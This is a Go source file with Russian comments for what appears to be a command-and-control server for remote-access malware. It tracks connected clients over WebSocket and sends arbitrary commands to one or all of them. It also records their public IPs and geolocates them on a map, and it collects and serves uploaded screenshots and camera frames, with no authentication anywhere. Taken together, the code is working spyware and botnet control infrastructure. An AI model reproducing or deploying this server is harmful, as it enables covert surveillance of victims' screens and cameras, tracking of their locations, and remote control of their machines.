package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// Константа для пути сохранения файлов
const (
	uploadPath = "./uploads"
)

// Metrics хранит данные о системных метриках клиента.
type Metrics struct {
	DiskTotal       uint64 `json:"disk_total"`
	DiskFree        uint64 `json:"disk_free"`
	MemoryTotal     uint64 `json:"memory_total"`
	MemoryAvailable uint64 `json:"memory_available"`
	Processor       string `json:"processor"`
	OS              string `json:"os"`
	Error           string `json:"error,omitempty"`
}

// Client хранит данные о соединении, уникальный идентификатор, публичный IP и метрики.
type Client struct {
	ID      string
	Conn    *websocket.Conn
	IP      string
	Metrics *Metrics
}

// ClientMessage описывает формат JSON‑сообщений от клиента.
type ClientMessage struct {
	Command string          `json:"command"`
	Data    json.RawMessage `json:"data"`
}

var (
	logger = log.New(os.Stdout, "SERVER: ", log.Ldate|log.Ltime|log.Lshortfile)

	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	// Храним всех подключённых клиентов по их ID.
	wsClients      = make(map[string]*Client)
	wsClientsMutex sync.Mutex

	// Счётчик для генерации уникальных идентификаторов.
	clientCounter int
)

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logger.Println("Ошибка апгрейда WebSocket:", err)
		return
	}

	wsClientsMutex.Lock()
	clientCounter++
	clientID := fmt.Sprintf("client-%d", clientCounter)
	client := &Client{ID: clientID, Conn: conn, IP: ""}
	wsClients[clientID] = client
	wsClientsMutex.Unlock()

	logger.Printf("WebSocket клиент %s подключён", clientID)

	// Отправляем клиенту его ID
	if err := conn.WriteMessage(websocket.TextMessage, []byte("id:"+clientID)); err != nil {
		logger.Printf("Ошибка отправки ID клиенту %s: %v", clientID, err)
	}

	defer func() {
		wsClientsMutex.Lock()
		delete(wsClients, clientID)
		wsClientsMutex.Unlock()
		conn.Close()
		logger.Printf("WebSocket клиент %s отключён", clientID)
	}()

	// Чтение сообщений от клиента
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			logger.Printf("Ошибка чтения WebSocket у клиента %s: %v", clientID, err)
			break
		}
		msgStr := string(message)
		logger.Printf("Клиент %s отправил: %s", clientID, msgStr)
		if strings.HasPrefix(msgStr, "ip:") {
			ip := strings.TrimPrefix(msgStr, "ip:")
			wsClientsMutex.Lock()
			client.IP = ip
			wsClientsMutex.Unlock()
			logger.Printf("Сохранён публичный IP для клиента %s: %s", clientID, ip)
		} else if strings.HasPrefix(msgStr, "{") {
			var cm ClientMessage
			if err := json.Unmarshal(message, &cm); err != nil {
				logger.Printf("Ошибка декодирования JSON от клиента %s: %v", clientID, err)
				continue
			}
			switch cm.Command {
			case "metrics":
				var m Metrics
				if err := json.Unmarshal(cm.Data, &m); err != nil {
					logger.Printf("Ошибка декодирования метрик от клиента %s: %v", clientID, err)
				} else {
					wsClientsMutex.Lock()
					client.Metrics = &m
					wsClientsMutex.Unlock()
					logger.Printf("Получены метрики от клиента %s: %+v", clientID, m)
				}
			default:
				logger.Printf("Неизвестная команда JSON от клиента %s: %s", clientID, cm.Command)
			}
		} else {
			logger.Printf("Получено сообщение от клиента %s: %s", clientID, msgStr)
		}
	}
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	if cmd == "" {
		http.Error(w, "Параметр cmd отсутствует", http.StatusBadRequest)
		return
	}
	targetID := r.URL.Query().Get("id")
	wsClientsMutex.Lock()
	defer wsClientsMutex.Unlock()
	if targetID != "" {
		client, ok := wsClients[targetID]
		if !ok {
			http.Error(w, "Клиент с таким ID не найден", http.StatusNotFound)
			return
		}
		if err := client.Conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
			logger.Printf("Ошибка отправки команды клиенту %s: %v", targetID, err)
			http.Error(w, "Ошибка отправки команды", http.StatusInternalServerError)
			return
		}
		logger.Printf("Команда '%s' отправлена клиенту %s", cmd, targetID)
	} else {
		for _, client := range wsClients {
			if err := client.Conn.WriteMessage(websocket.TextMessage, []byte(cmd)); err != nil {
				logger.Printf("Ошибка отправки команды клиенту %s: %v", client.ID, err)
			} else {
				logger.Printf("Команда '%s' отправлена клиенту %s", cmd, client.ID)
			}
		}
	}
	w.Write([]byte("Команда отправлена"))
}

func mapHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("client")
	var chosen *Client

	wsClientsMutex.Lock()
	if clientID != "" {
		if client, ok := wsClients[clientID]; ok && client.IP != "" {
			chosen = client
		}
	} else {
		for _, client := range wsClients {
			if client.IP != "" {
				chosen = client
				break
			}
		}
	}
	wsClientsMutex.Unlock()

	if chosen == nil {
		http.Error(w, "Нет клиента с сохранённым публичным IP", http.StatusNotFound)
		return
	}

	geoURL := fmt.Sprintf("http://ip-api.com/json/%s", chosen.IP)
	resp, err := http.Get(geoURL)
	if err != nil {
		http.Error(w, "Ошибка запроса геоданных", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	type Location struct {
		Status string  `json:"status"`
		Lat    float64 `json:"lat"`
		Lon    float64 `json:"lon"`
	}
	var loc Location
	if err := json.NewDecoder(resp.Body).Decode(&loc); err != nil {
		http.Error(w, "Ошибка декодирования геоданных", http.StatusInternalServerError)
		return
	}
	if loc.Status != "success" {
		http.Error(w, "Геокодирование не удалось", http.StatusInternalServerError)
		return
	}

	redirectURL := fmt.Sprintf("https://www.google.com/maps?q=%f,%f", loc.Lat, loc.Lon)
	http.Redirect(w, r, redirectURL, http.StatusFound)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	logger.Println("Получен запрос на загрузку данных")
	data, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Printf("Ошибка чтения данных: %v", err)
		http.Error(w, "Ошибка чтения данных", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	latestFrame := fmt.Sprintf("%s/latest_frame.jpg", uploadPath)
	if err := os.WriteFile(latestFrame, data, 0644); err != nil {
		logger.Printf("Ошибка обновления latest_frame.jpg: %v", err)
	}
	w.WriteHeader(http.StatusOK)
}

func uploadScreenshotHandler(w http.ResponseWriter, r *http.Request) {
	logger.Println("Получен запрос на загрузку скриншота")
	data, err := io.ReadAll(r.Body)
	if err != nil {
		logger.Printf("Ошибка чтения данных: %v", err)
		http.Error(w, "Ошибка чтения данных", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()
	filename := fmt.Sprintf("%s/screenshot_%d.jpg", uploadPath, time.Now().UnixNano())
	if err := os.WriteFile(filename, data, 0644); err != nil {
		logger.Printf("Ошибка сохранения файла: %v", err)
		http.Error(w, "Ошибка сохранения файла", http.StatusInternalServerError)
		return
	}
	latestScreenshot := fmt.Sprintf("%s/latest_screenshot.jpg", uploadPath)
	if err := os.WriteFile(latestScreenshot, data, 0644); err != nil {
		logger.Printf("Ошибка обновления latest_screenshot.jpg: %v", err)
	}
	logger.Printf("Скриншот успешно сохранён: %s", filename)
	w.WriteHeader(http.StatusOK)
}

func timeHandler(w http.ResponseWriter, r *http.Request) {
	currentTime := time.Now().UTC().Format(time.RFC3339)
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(currentTime))
}

func publicIPHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Метод не поддерживается", http.StatusMethodNotAllowed)
		return
	}
	type PublicIP struct {
		IP string `json:"public_ip"`
	}
	var pip PublicIP
	decoder := json.NewDecoder(r.Body)
	if err := decoder.Decode(&pip); err != nil {
		logger.Printf("Ошибка декодирования JSON: %v", err)
		http.Error(w, "Неверный формат данных", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()
	logger.Printf("Получен публичный IP через HTTP: %s", pip.IP)
	w.WriteHeader(http.StatusOK)
}

func clientsHandler(w http.ResponseWriter, r *http.Request) {
	wsClientsMutex.Lock()
	clients := make([]*Client, 0, len(wsClients))
	for _, client := range wsClients {
		clients = append(clients, client)
	}
	wsClientsMutex.Unlock()

	tmpl, err := template.ParseFiles("clients.html")
	if err != nil {
		logger.Printf("Ошибка загрузки шаблона clients.html: %v", err)
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, clients)
}

func clientHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Не указан клиент", http.StatusBadRequest)
		return
	}
	tmpl, err := template.ParseFiles("client.html")
	if err != nil {
		logger.Printf("Ошибка загрузки шаблона client.html: %v", err)
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, clientID)
}

// Новый обработчик для получения метрик клиента
func clientMetricsHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Не указан клиент", http.StatusBadRequest)
		return
	}
	wsClientsMutex.Lock()
	client, ok := wsClients[clientID]
	wsClientsMutex.Unlock()
	if !ok {
		http.Error(w, "Клиент не найден", http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	if client.Metrics == nil {
		w.Write([]byte("{}"))
		return
	}
	jsonData, err := json.Marshal(client.Metrics)
	if err != nil {
		http.Error(w, "Ошибка сериализации", http.StatusInternalServerError)
		return
	}
	w.Write(jsonData)
}

func getFileExtension(contentType string) string {
	switch contentType {
	case "image/jpeg":
		return "jpg"
	case "audio/wav":
		return "wav"
	default:
		return "dat"
	}
}

func cleanupJPGFiles() {
	files, err := os.ReadDir(uploadPath)
	if err != nil {
		logger.Printf("Ошибка чтения директории %s: %v", uploadPath, err)
		return
	}

	for _, file := range files {
		if !file.IsDir() && strings.HasSuffix(strings.ToLower(file.Name()), ".jpg") {
			filePath := filepath.Join(uploadPath, file.Name())
			if err := os.Remove(filePath); err != nil {
				logger.Printf("Ошибка удаления файла %s: %v", filePath, err)
			} else {
				logger.Printf("Удалён файл: %s", filePath)
			}
		}
	}
}

func startJPGCleanupJob(interval time.Duration) {
	go func() {
		for {
			cleanupJPGFiles()
			time.Sleep(interval)
		}
	}()
}

func main() {
	if err := os.MkdirAll(uploadPath, os.ModePerm); err != nil {
		logger.Fatalf("Ошибка создания директории: %v", err)
	}

	startJPGCleanupJob(10 * time.Minute)

	http.HandleFunc("/ws", wsHandler)
	http.HandleFunc("/clientmetrics", clientMetricsHandler)
	http.HandleFunc("/client", clientHandler)
	http.HandleFunc("/command", commandHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/upload/screenshot", uploadScreenshotHandler)
	http.HandleFunc("/api/time", timeHandler)
	http.HandleFunc("/ip", publicIPHandler)
	http.HandleFunc("/map", mapHandler)
	http.HandleFunc("/", clientsHandler)
	http.Handle("/uploads/", http.StripPrefix("/uploads/", http.FileServer(http.Dir(uploadPath))))

	logger.Println("Сервер запущен на :4000")
	log.Fatal(http.ListenAndServe(":4000", nil))
}
